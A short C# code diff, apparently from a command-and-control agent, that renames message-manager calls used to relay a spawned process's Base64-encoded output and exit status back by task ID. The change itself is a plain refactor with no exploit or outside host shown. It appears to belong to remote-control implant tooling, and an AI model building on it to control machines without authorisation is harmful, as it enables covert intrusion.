@@ -36,7 +36,7 @@ namespace Agent
         {
             this.process.ErrorDataReceived += (sender, errorLine) => {
                 if (errorLine.Data is not null)
-                    messageManager.AddResponse(new InteractMessage()
+                    messageManager.AddInteractMessage(new InteractMessage()
                     {
                         data = Misc.Base64Encode(errorLine.Data + Environment.NewLine),
                         task_id = task_id,
@@ -45,7 +45,7 @@ namespace Agent
             };
             this.process.OutputDataReceived += (sender, outputLine) => { 
                 if (outputLine.Data is not null)
-                    messageManager.AddResponse(new InteractMessage()
+                    messageManager.AddInteractMessage(new InteractMessage()
                     {
                         data = Misc.Base64Encode(outputLine.Data + Environment.NewLine),
                         task_id = task_id,
@@ -71,7 +71,7 @@ namespace Agent
 
         private void Process_Exited(object? sender, EventArgs e)
         {
-            this.messageManager.AddResponse(new TaskResponse()
+            this.messageManager.AddTaskResponse(new TaskResponse()
             {
                 user_output = Environment.NewLine + "Process Finished.",
                 task_id = this.task_id,
